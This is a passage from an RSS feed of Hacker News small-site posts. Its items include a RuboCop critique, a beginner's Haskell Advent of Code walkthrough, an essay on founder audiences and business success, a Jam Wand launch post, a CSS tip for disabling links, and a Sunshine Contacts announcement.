that starts with a brightly coloured <code>if</code> keyword, and indentation
that suggests a conditional.</p>

<p>But skimming over the guard-clause-enhanced code we see neither of
these landmarks. Instead, we find indentation that suggests
<em>procedural</em> code: a series of statements that run from top to bottom.
RuboCop has taken an obvious conditional and reshaped it to look like
there is no conditional.</p>

<p>The <code>Style/GuardClause</code> cop is double bad, and misses out on two
doughnuts.</p>

<h2 id="disclaimerconclusion">Disclaimer/Conclusion</h2>

<p>I don’t dislike RuboCop. It’s well made, and a useful tool.</p>

<p>The problem starts when it is viewed not as a tool, but as a set of
divine commandments. Thou shalt not make implicit <code>nil</code>s explicit.
Thou shalt not write long-form conditionals. Thus saith the RuboCop.</p>

<p>This is not necessarily a problem with RuboCop itself — it’s a
problem with how people sometimes use RuboCop. One could argue that
the defaults aren’t great, but they are not a problem until someone
hooks them up to CI.</p>

<p>My only aim here is to disabuse readers of the notion that RuboCop can
only make code better. It’s a tool, and whether it helps or hurts
depends on how it’s used. Don’t be afraid to disable cops if you can’t
see how they benefit the team.</p>



        

      </div></div>]]>
            </description>
            <link>https://www.rubypigeon.com/posts/my-beef-with-rubocop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147990</guid>
            <pubDate>Thu, 19 Nov 2020 10:19:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advent of Code in Haskell: T Minus 16]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25147851">thread link</a>) | @todsacerdoti
<br/>
November 19, 2020 | https://www.bulters.dev/posts/t-minus-16/ | <a href="https://web.archive.org/web/*/https://www.bulters.dev/posts/t-minus-16/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			
<p>For the past few years I’ve been trying to learn haskell in various ways but
have never been able to stick to the method, let alone actually “become
productive” in Haskell.</p>
<p>Since I’ve decided to spent more time on tinkering during the evenings, I
thought it would be a nice idea to document my learning process.</p>
<p>The general idea is that I will do the challenges from the Advent of Code (2020
edition) and implement them in Haskell. And since there are 16 days left before
“it begins”, I’ll kick off with doing some of the challenges from last year to
prepare.</p>
<p>The documentation part will not really involve the learning of the language
itself, but more on “everything ephemeral” (the plumbing?). I’ll try to
elaborate on some of the “typical difficult Haskell stuff” as I encounter them
(and when I deem them appropriate).</p>
<p>I’m convinced that Haskell in itself is quite an easy language to grasp (once
you manage to get “some functional programming practices to click”), but that
there are a number of barriers that prevent people from becoming productive in
it.</p>

<p>During this attempt to grasp Haskell I will be working on my Windows 10 laptop
under WSL2 running an Ubuntu 20.04 installation. My notes will assume that a
sort of sane setup for an editor is available.</p>
<p>I use vim myself, with a fairly minimal vimrc (no haskell specific
configuration) and the following packages:</p>
<div><pre><code data-lang="shell">ale/ coc.nvim/ fzf/ ultisnips/ vim-go/ vim-repeat/ vim-surround/ vim-vinegar/
</code></pre></div><p>To get started I installed the GHC compiler through the default Ubuntu package
manager:</p>
<p>And then verified that installation has succeeded by running</p>
<div><pre><code data-lang="shell">&gt; ghci --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; ghc --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; cabal --version
cabal-install version 2.4.0.0
compiled using version 2.4.0.1 of the Cabal library
</code></pre></div><p>This ensured that all binaries are properly available (in path) to get going.</p>

<p>For those who do not know, The Advent of Code (TAOC) is a yearly event in which
50 programming assignments are made available during the first 25 days of
december, outlining a glorious story usually involving santa, elves, presents
and the (not so) daily challenges they face.</p>
<p>Every day two programming challenges are presented that take a certain input
(your daily input file) and require you to do StuffTM with that input to
accomplish a certain task. Don’t worry, it will all become clear when you
actually try this.</p>
<p>You can register on <a href="https://adventofcode.com/">https://adventofcode.com</a>.</p>

<p>With the environment setup I create a fresh directory for the first day:</p>
<p>and paste my input for the first challenge into taoc19/day1/input.txt</p>
<p>Since I’m not trying to do anything fancy right now, I create a new cabal
package with the <code>cabal init</code> command.  During the interrogation cabal gives
me, I stick with the defaults, except when asked whether I’m building a package
or executable, in which I choose ‘executable’.</p>
<p>This gives me a few files that I can use to start building.</p>
<p>To start the process I need to get my data from the input.txt file into a
function. Since I’ve read something about Haskell before (and some quick
googling) I try using the readFile function (from the stdlib/Prelude) in GHCi
and voila:</p>
<div><pre><code data-lang="haskell"><span>let</span> raw <span>=</span> readFile <span>"input.txt"</span>
</code></pre></div><p>The problem arises when I put the <code>let raw = readFile 'input.txt'</code> line in my
main do-block. Haskell has this notorious Monad thing going on, which I do not
yet fully grasp. But you don’t need to understand it to use it, so a small
Google session quickly led to the insight that I need to “reverse arrow put”
the result of the <code>readFile</code> call into a variable instead of using <code>let</code>. This
leads to a really minimal Main.hs file</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>
        print raw
</code></pre></div><p>when loadng it into GHCi and running main, it nicely outputs my input data.
First win achieved!</p>
<div><pre><code data-lang="shell">Prelude&gt; :l Main.hs
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
&lt;your data here&gt;
</code></pre></div><p>Step two involves splitting up the input into lines and converting these lines
into an array of integers.</p>
<p>To accomplish the first step, Haskell has a handy function <code>lines</code> (in the
Prelude) available. The second part involves the <code>read</code> function (also a
Prelude thing) and specifying the type of the statement. Initially I created a
separate function <code>stoi</code> for this</p>
<div><pre><code data-lang="haskell"><span>stoi</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>stoi</span> <span>=</span> rread
</code></pre></div><p>but decided that “casting” the data inline would still be perfectly readable
(and perhaps even clearer), resulting in:</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        print nums
</code></pre></div><p>Achievement 2 unlucked, I’m finally ready to do something with my data.</p>
<p>Part 1 of the challenge involves calculating how much fuel we need according to
a certain formula, so for every input we apply a function to it, and sum the
results.o</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> <span>=</span> id <span>-- todo</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        <span>-- apply the fuelRequired function to all the inputs and sum the result</span>
        <span>let</span> totalFuel <span>=</span> sum <span>$</span> map fuelRequired nums
        print totalFuel
</code></pre></div><p>which if we load it into GHCi gives us the sum of all the weights.</p>
<div><pre><code data-lang="shell">*Main&gt; :edit
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
<span>9961383</span>
*Main&gt;
</code></pre></div><p>The actual calculation of required fuel involves dividing the weight by 3,
rounding it down and subtracting 2, giving me a really simple to implement
fuelRequired function.</p>
<div><pre><code data-lang="haskell"><span>-- fuelRequired should be the mass x, divided by 3, minus 2</span>
<span>-- with a minimum of 0.</span>
<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> x <span>=</span> max <span>0</span> <span>$</span> (div x <span>3</span>) <span>-</span> <span>2</span>
</code></pre></div><p>Running the main file in GHCi again (after reloading the Main.hs file) gives me
a number that, when entered in the answer field on AOC tells me I’m on the
right track! Yay!</p>

<p>Oh, surprise, physics kicks in. Turns out, fuel weighs something as well, so
we’ll have to calculate the amount of fuel required to carry the fuel, which
also requires fuel to carry, etc.</p>
<p>This looks like a typically recursive situation where fuel that requires no
fuel (i.e. weighing 9 or less) serves as a perfect termination case. Let’s try
to write this as a recursive function with a guard in it.</p>
<div><pre><code data-lang="haskell"><span>-- recursiveFuelRequired is implemented as a recursive function</span>
<span>-- where we terminate recursion as soon as there is no more</span>
<span>-- fuel required for a certain component.</span>
<span>recursiveFuelRequired</span> x
        <span>|</span> x <span>==</span> <span>0</span>    <span>=</span> <span>0</span>
        <span>|</span> otherwise <span>=</span> <span>let</span> thisFuel <span>=</span> fuelRequired x <span>in</span>
                        thisFuel <span>+</span> recursiveFuelRequired thisFuel
</code></pre></div><p>and then calculating the actual total fuel required in the same way as before,
but now with this new recursive function:</p>
<div><pre><code data-lang="haskell"><span>let</span> totalFuel <span>=</span> sum <span>$</span> map recursiveFuelRequired nums
<span>print</span> totalFuel
</code></pre></div><p>output copy-paste into solution field, press submit, and… GREAT SUCCESS!</p>
<p>I’ll cover my solving of the Day 2 challenges somewhere in the upcoming days.</p>

		</section></div>]]>
            </description>
            <link>https://www.bulters.dev/posts/t-minus-16/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147851</guid>
            <pubDate>Thu, 19 Nov 2020 09:50:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Causality between having a preemptive audience and business success: Case study]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25147734">thread link</a>) | @mxmzb
<br/>
November 19, 2020 | https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study | <a href="https://web.archive.org/web/*/https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><article><p><span><p><em>In for the TLDR? Find the <a href="https://twitter.com/mxmzb/status/1329106639258087428">Twitter thread version here</a>.</em></p><p>A friend of mine is convinced that if you have a lot of followers on an arbitrary social media platform, you are in a much better spot to launch your product than without an audience. He points at people like Gary Vee, and Tai Lopez, implying that they are selling products purely on the back of their popularity. And although he has a point, I think this is extreme cherry-picking. In my opinion, it works for them for specific and unique reasons. </p><p>As I noticed, building an audience <strong>before having a product/service</strong> seems to be an evolving trend, even in the indie maker community. In my effort to find clearness, I've compiled a list of founders and influencers running businesses with differently sized audiences. I hope the examples will shed light on the correlation between large audiences and entrepreneurial success.</p><p>Before we start looking into this: You'll notice that when I write "audience", I <em>usually</em> refer to the Twitter following of a founder. That doesn't mean an audience can't be built on another platform, but it's what most tech founders associate with "audience". </p><p>Further, I will be referring to various sizes of audiences and grades of (routinely presumed) economic success. Those lines are blurry and defined by my intuition of what is what for the average indie maker.</p><h2>Large audience but little to no success</h2><p><em>A large audience in this context leans towards 50k and goes up infinitely. Little to no success means that the project/founder can not self-sustain or the project has died.</em></p><p>You have 50k followers on the platform of your choice. Will you be able to make your next startup successful with that many people behind your back?</p><p><a href="https://twitter.com/tjholowaychuk">TJ Holowaychuk</a> has 47k followers on Twitter (and 44k are occasionally seeing his contributions on GitHub). If you're a developer working with Node.js a lot, there is a good chance you've been using his code, or at least, code impacted by TJ.</p><p>TJ runs a software business called <a href="https://apex.sh/">Apex</a>, which offers monitoring/logging/uptime. I ran across it a few years ago and ever since haven't seen it build up a lot of momentum. Then, two months ago, I found <a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174?commentId=-MF0nsQqF-pLhijfLpgm">a comment by TJ on Indie Hackers</a>:</p><blockquote><p>Congrats! It's definitely tricky, even with my reasonably rare ~50k Twitter community it's still difficult, startups have it so easy in comparison.</p><p>-- <cite>TJ Holowaychuk</cite></p></blockquote><p>Maybe 50k is not enough. How about 2.6m? In May 2019, <a href="https://web.archive.org/web/20190528072150/https://www.instagram.com/arii/">Instagram influencer Arii</a> failed <a href="https://www.tyla.com/news/celebrity-instagram-influencer-with-26m-followers-struggles-to-sell-36-t-shirts-20190528">to sell 36 T-Shirts</a>. The story has been torn apart by media shortly after, with various theories on what had gone wrong. Fake followers, wrong audience, no marketing strategy, lousy product. I'm convinced it's everything except fake followers. Sure, she probably has many, but at 2.5m total, I am confident a few hundred thousand legitimate ones rule this out as the sole reason for failure.</p><p>Do you remember <a href="https://en.wikipedia.org/wiki/Beme">Beme</a>? The social app to <a href="https://www.youtube.com/watch?v=mixsze6uJPg">record videos when you hold it up to your chest</a>? This was an endeavor by Casey Neistat, who had <a href="https://web.archive.org/web/20150809013605/https://www.youtube.com/user/caseyneistat">~1m YouTube subscribers</a>, <a href="https://web.archive.org/web/20150705203923/https://twitter.com/CaseyNeistat">~135k followers on Twitter</a>, and <a href="https://web.archive.org/web/20150813225907/https://instagram.com/caseyneistat/">~400k on Instagram</a> back at the time. Despite accumulating millions of new fans of his own on all platforms ever since and CNN buying Beme in 2016, it eventually shut down in 2018.</p><p>Beme wasn't the only project by Casey that went down. There is also <a href="https://www.368.nyc/about">368</a>, a <em>"place where professional gamers, internet creators and cultural icons meet and create"</em>. Although it is open and operating, it's safe to say it's not what Casey had envisioned for it by far.</p><blockquote><p>[...]<!-- --> building a business is a really slow, really painful process <!-- -->[...]</p><p>-- <cite><a href="https://youtu.be/a49xvHviVds?t=123">Casey Neistat</a></cite></p></blockquote><p>Not convinced yet? Let's reduce the audience down to its purpose: Attention and somewhat targeted reach.</p><p>With this in mind, we can look at the products, which have been spun up and <a href="https://killedbygoogle.com/">eventually killed by yours truly, Google</a>.</p><p>Although Google isn't a person, I think it's a potent example that a social audience isn't tied to a projects' success. Google has millions of followers on all major social media platforms (don't expect me to link the accounts up).</p><p>For emphasis: This is a <a href="https://killedbygoogle.com/">collection of &gt; 200 diverse products</a> by big G itself, an <a href="https://www.theverge.com/2020/1/16/21069458/google-alphabet-trillion-dollar-market-cap-apple-microsoft">ex-1-trillion-net-worth</a> company that made 160 billion in revenue in 2019.</p><p>Each of those products has been likely in development for at least a year, with a dedicated and motivated group of brilliant people working on it. Furthermore, many of those products have been rolled out to Googles' existing audience by integrating them seamlessly into the user experience (Picasa, Google+, Google Reader, Google Video, etc.) or otherwise promoting them with the help of Googles' ecosystem and a bag of serious cash.</p><h2>Medium audience but immense success</h2><p><em>A medium audience in this context ranges from approximately 5-45k. Immense success means that the project is alive and healthy, and the founders can live far beyond their needs, with an ample surplus.</em></p><p>This is a selection of folks with a following that you wouldn't deem overwhelming but still have more to nurture their projects from than the average indie maker. To provide these particular examples significance, I made sure that they had a disproportionate amount of success. I also would like you to pay attention to how their followings became vast <em>after</em> (or should I say <em>while</em>?) building their businesses.</p><p>Probably you didn't expect someone like <a href="https://twitter.com/levelsio">Pieter Levels</a>, who now has an impressive following (currently ~92k on Twitter) and is popular in the industry of online entrepreneurship, to be in this category. However, if you look closely, <a href="https://www.crunchbase.com/organization/remote-ok">at the time Pieter launched RemoteOK</a> in 2015, he <a href="https://web.archive.org/web/20150129205450/https://twitter.com/levelsio">had about 9k followers</a>. I'm not saying that's irrelevant, but I am having trouble to justify <a href="https://remoteok.io/">RemoteOK's</a> success from solely that. <a href="https://www.crunchbase.com/organization/nomad-list">Pieter launched Nomad List</a>, the second startup he is known for, even earlier, in August 2014, when he barely had <a href="https://web.archive.org/web/20140813033726/https://twitter.com/levelsio">4k followers</a> on Twitter. That didn't hinder him to get significant press coverage early on by such as <a href="https://www.inc.com/jessica-stillman/the-best-cities-in-the-world-for-digital-nomads.html">Inc.com</a> or <a href="https://www.businessinsider.in/how-to-find-the-best-places-to-live-when-you-work-remotely/articleshow/39427000.cms">Business Insider India</a>.</p><p><a href="https://twitter.com/yongfook">Jon Yongfook</a> (~18k followers) not only has somewhat of a celebrity status in Singapore, but he also has a noteworthy <a href="https://www.instagram.com/yongfook/">Instagram following</a> (~14k followers). Jon created <a href="https://www.bannerbear.com/">Bannerbear</a> and <a href="https://www.bannerbear.com/open/">discloses his numbers openly</a>. Before Bannerbear, <a href="https://twitter.com/yongfook/status/1304212610204577792">he has "failed"</a> a lot of times, both with <a href="https://twitter.com/yongfook/status/1171311476222464001">zero revenue</a> projects and projects that had <a href="https://blog.yongfook.com/don-t-fail-because-your-marketing-sucks.html">millions raised and hundreds of employees</a>.</p><p><a href="https://twitter.com/shl">Sahil Lavignia</a>, who has accumulated even more followers than Pieter by now (~143k), <a href="https://sahillavingia.com/reflecting">can tell a bizarre story</a> about his company <a href="https://gumroad.com/">Gumroad</a>. He had <a href="https://web.archive.org/web/20120130074352/https://twitter.com/shl">~9k followers</a> when he got funded in the millions around 2011-2012. Although I have been on Twitter at that time I fail to remember how influential numbers like this were back then. In the darkest hours of Gumroad, around November 2015, Sahil had grown his audience to <a href="https://web.archive.org/web/20151129034039/https://twitter.com/shl">~17k followers</a>. Another three years later, in November 2018, he had <a href="https://web.archive.org/web/20180208231910/https://twitter.com/shl">~20k followers</a> when Gumroad slowly <a href="https://sahillavingia.com/reflecting">started to rehabilitate from its prior downturn</a>.</p><p>Nowadays, you can't browse Twitter even for a minute without seeing a Gumroad link popping up somewhere. But Sahil jumped from success to failure and back with each transition taking years and rather moderately growing his Twitter audience. I'd argue his Twitter presence never played a critical role in his business' following success: To this date, his followers presumably view him more as the daily source of wise life advice than as the CEO of Gumroad.</p><h2>Little to no audience but great success</h2><p><em>Little to no audience in this context is everything less than ~5k followers. Great success means that the project is alive and healthy, and the founders can at least sustain their life financially from the project alone. Note that I did not research how many followers the founders in this category had at launch time because they fell into the given range even at the time of writing. But, naturally, you can assume it was even less.</em></p><p>On the other side, there are those who have no large audience and succeeded at their business. These folks are laser-focusing on building their business, not on building an audience for their business.</p><p>Because it's easy to find successful products of founders who don't have a large audience (hint: Look for cool products, the founders are almost always small on social media), here are more examples:</p><p><a href="https://twitter.com/arichaprasad">Richa Prasad</a> (~40 followers) and <a href="https://twitter.com/lucygliang">Lucy Liang</a> (~450 followers) offer online weight loss coaching on <a href="https://www.coachviva.com/">Coach Viva</a> and have recently hit $10k monthly average. I love how they've managed to get a common idea to work <a href="https://www.indiehackers.com/interview/the-long-road-to-10k-in-30-days-414169d6b8">with smart, sequential marketing efforts</a>. For example, they started out with their personal network, made adjustments to the product itself based on feedback, cemented their authenticity with reviews, and eventually landed on <a href="https://www.youtube.com/channel/UCQjOVgcoZvC6-EK0xgankpQ">YouTube</a>.</p><p><a href="https://twitter.com/brettwill1025">Brett Williams</a> is virtually non-existent on social media but has had tremendous success building <a href="https://www.designjoy.co/">designjoy.co</a>), a productized service where he sells web design on a monthly subscription. With that, Brett is <a href="https://www.indiehackers.com/product/hue">reporting to make $26k MRR</a> and has recently crossed <a href="https://www.indiehackers.com/post/hit-400k-as-a-solo-founder-designjoy-update-35af18ab82">$400k in total revenue</a>. The project is about three years old at the time of writing.</p><p><a href="https://twitter.com/sarahhum">Sarah Hum</a> (~4k followers) and <a href="https://twitter.com/a13n">Andrew Rasmussen</a> (~1.5k followers) are the founders of <a href="https://canny.io/">Canny</a>, a crowd-feedback tool used by large brands and tools like <a href="https://ahrefs.canny.io/">ahrefs</a>, <a href="https://react-native.canny.io/feature-requests">React Native</a>, and even <a href="https://netflix.canny.io/">Netflix</a>. Although Canny has <a href="https://www.indiehackers.com/product/canny/1m-arr-milestone--MFew44ybD_39HOGO_N7">recently hit $1m ARR</a>, neither Sarah nor Andrew have an exceptional social media following. <a href="https://canny.io/blog/how-we-built-a-1m-arr-saas-startup/">They found success in strategies</a> like content marketing, cold outreach, and putting effort into a great launch on <a href="https://www.producthunt.com/posts/canny-3">Product Hunt</a>.</p><p><a href="https://twitter.com/linuz90">Fabrizio Rinaldi</a> (~4k followers) and <a href="https://twitter.com/frankdilo">Francesco Di Lorenzo</a> (~2,5k followers) are building <a href="https://mailbrew.com/">Mailbrew</a>, an all-in-one email digest for all your favorite news and updates in one place. Among their popular users are DHH and Chris Coyier, and they have reached <a href="https://www.indiehackers.com/product/mailbrew/revenue">6.5k MRR</a>, which means they have about 800 paying customers.</p><p><a href="https://twitter.com/dannypostmaa">Danny Postma</a> (~4,5k followers) is building <a href="https://headlime.io/">Headlime</a>, a copywriting tool to help you create better headlines. The tool has ~2k votes on Product Hunt and generated $16k in the first 48 hours. Danny is currently <a href="https://twitter.com/dannypostmaa/status/1325993923131568128">working on V2</a> and has almost retreated from social media, which should tell you where his focus is.</p><p><em>I know this section …</em></p></span></p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study">https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study</a></em></p>]]>
            </description>
            <link>https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147734</guid>
            <pubDate>Thu, 19 Nov 2020 09:29:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Live-streaming BTC futures prices from 4 exchanges]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25147593">thread link</a>) | @hcarlens
<br/>
November 19, 2020 | https://coinlobster.com/combined.html | <a href="https://web.archive.org/web/*/https://coinlobster.com/combined.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <h5>Subscribe For Updates</h5>
                <p>More features and exchanges coming soon.</p>

                

            </div></div>]]>
            </description>
            <link>https://coinlobster.com/combined.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147593</guid>
            <pubDate>Thu, 19 Nov 2020 09:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jam Wand: A no-code tool to change your website copy, right from your website]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25147320">thread link</a>) | @thedg
<br/>
November 19, 2020 | https://words.jam.dev/introducing-jam-wand/ | <a href="https://web.archive.org/web/*/https://words.jam.dev/introducing-jam-wand/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Today we are excited to launch the beta for Jam Wand -- with it, you can click on any text in your live website, edit it, and submit the change to GitHub to be merged into the code. It just launched in beta today, and you can sign up at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/SXjlHrFlWNQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Jam Wand is the tool <a href="https://twitter.com/_irtefa">Irtefa</a> and I wished we had when we were product managers at Cloudflare. We used to spend too much engineering time changing copy. We felt bad asking engineers for yet another copy change, and engineers felt bad because checking out yet another copy-fixes branch is time consuming and boring. It was a lose-lose.</p><p>We wished changing copy on a website was as easy as changing copy in a Google Doc. That was the goal for building Jam Wand.</p><p>With Jam Wand, any non-technical member of the team - without dealing with code or git - can make copy changes to their live website. It opens up pull requests to the codebase, so all engineers have to do is review and merge, and the copy change is live. </p><p>We know it’s cheesy, but we used to be PMs, we love building products and our dream is to help product teams work better together and build better products, faster. </p><p>We think collaborative teams where everyone can contribute what they do best -- where customer support can update in-product help text, marketing can update landing page copy, dev rel can update developer docs, sales can update CTA text, and so on, leads to better products - which makes teams happy, users happy, it is a win-win.</p><h2 id="how-jam-wand-has-changed-our-workflow"><strong>How Jam Wand has changed our workflow</strong></h2><p>We built the Jam Wand website using Jam Wand (I know, you are very surprised). But it actually changed our workflow -- we didn’t have to have copy ready for engineering before they built the site. Instead, an engineer created the website scaffold with some placeholder text, and then deployed it, and once it was live, I could go in and write in the copy, right from the live website.</p><h2 id="a-new-way-to-build-and-maintain-documentation"><strong>A new way to build and maintain documentation</strong></h2><p>What we experienced at Cloudflare and what Jam users tell us, is that while all website copy is a challenge to update, developer documentation sites are a special challenge.</p><p>It’s too hard to suggest a fix to documentation (just explaining where the change should be in the docs site takes effort), and then to make the change, it has to be Jira-ed and scheduled into an engineering sprint. And so, many changes to docs that would improve the developer experience often aren’t made because there is too much overhead.</p><p>Jam transforms your developer documentation site into a collaborative workspace, like a Google Doc. And now, with Jam Wand, you can even change the copy right from the page, making it so that anyone can help improve your developer documentation. We’re excited for what that means for docs especially.</p><h2 id="can-t-wait-to-hear-what-you-think"><strong>Can’t wait to hear what you think</strong></h2><p>You can sign up for the beta at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><p>There’s a queue, but we want to prioritize bringing in people who care about collaboration and no-code workflows, who can help us shape the future of the product. You’ve read all the way to the end here, so it’s likely that’s you 😁 -- DM us <a href="https://twitter.com/scoopsofjam">@scoopsofjam</a> your waitlist # and we will try to bring you in early!</p><p>And lastly - Jam Wand was built by <a href="https://twitter.com/_cichocinski">Tomasz Cichociński</a>, and designed by <a href="http://gloriayanli.com/">Gloria Li</a>. Just wanted to give them a little shout here 🤩 &nbsp;go Tomasz and Gloria!<br></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://words.jam.dev/introducing-jam-wand/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147320</guid>
            <pubDate>Thu, 19 Nov 2020 08:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Disable Links with Only CSS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25147185">thread link</a>) | @emilmoe
<br/>
November 18, 2020 | https://blog.cloudmonitor.dk/how-to-disable-links-with-only-css | <a href="https://web.archive.org/web/*/https://blog.cloudmonitor.dk/how-to-disable-links-with-only-css">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1605736637172/NJcXTDUTF.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>Agreed, this is a bit of a hack.</p>
<p>To keep things streamlined with WordPress, I had to implement this hack the other day, where I wanted to disable tag links on just 1 page.</p>
<p>Instead of fiddling with a new plugin, I found it easier, in this case, to disable the link in the template engine with pure CSS.</p>
<p>The magic to remove the link feature lies in <code>pointer-events</code> while the rest ensures it doesn't look like one.</p>
<pre><code><span>a</span><span>.disabled</span> {
  <span>pointer-events</span>: none;      
  <span>text-decoration</span>: none;
  <span>cursor</span>: default;  
  <span>text-decoration</span>: none;
}
</code></pre>
<p>The semantics might be up for discussion, but the performance is possibly better than using Javascript.</p>
<p>This approach is available to all major browsers:  <a target="_blank" href="https://caniuse.com/pointer-events">CSS pointer-events (for HTML)</a> </p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.cloudmonitor.dk/how-to-disable-links-with-only-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147185</guid>
            <pubDate>Thu, 19 Nov 2020 07:53:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introducing Sunshine]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25147134">thread link</a>) | @rxever
<br/>
November 18, 2020 | https://sunshine.com/introducing-sunshine/ | <a href="https://web.archive.org/web/*/https://sunshine.com/introducing-sunshine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="838105f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>How do you make the mundane magical?&nbsp; Imagine if your contacts magically stayed up-to-date with no effort on your part.&nbsp; Or if the great photos you have of your friends got sent to them automatically. What if you never forgot another birthday?</p>

<p>The impossible is now possible. Smartphones have connected the world and put the entire internet into our pockets. We can get whatever we want delivered to our home whenever we want, sometimes by flying drone. With the rise of artificial intelligence, dreams of virtual assistants, self-driving cars and global facial recognition are no longer that far-fetched. However, despite transformational advances in technology, there are still tons of mundane, time-consuming tasks that we all do (or just don’t do) daily.<br><span><br><b>Sunshine’s technology will make the mundane effortless, free up your time, and make it easier to be thoughtful.</b></span></p>
<p><span>Every day, we muddle through tasks with technology that is “good enough” – contacting friends with stale information that may or may not reach them; searching through email for phone numbers and addresses that we know we have somewhere; manually and painstakingly creating group distribution lists for every occasion; scheduling time to get together with friends using a hodge-podge of calendar, email, and text; pinching and zooming through photos to find one with everyone’s eyes open. We’re used to the mess, and we’ve come to accept the friction.&nbsp;</span></p>

<p>No more.&nbsp; Everyday things should <b>just work</b>, and that’s Sunshine’s mission. We’re creating technology to address practical, everyday pain points in the basic, foundational tools that connect us with the people we care about. Ultimately, Sunshine will remove complexity in things like contact management, scheduling, event organization, and group communication so you can spend time more meaningfully.</p>

<p>We want to put the focus back on people, and let technology advance in its sophistication and fade into the background.</p>

<p>Today, we’re launching Sunshine Contacts (see our announcement here). Leveraging the power of artificial intelligence, Sunshine Contacts finds, deduplicates, and organizes your contacts. Using a variety of sources, we ensure your contact list is in one place, organized, always complete, and up-to-date.&nbsp; Sunshine Contacts makes your contacts <b>just work</b>.</p>

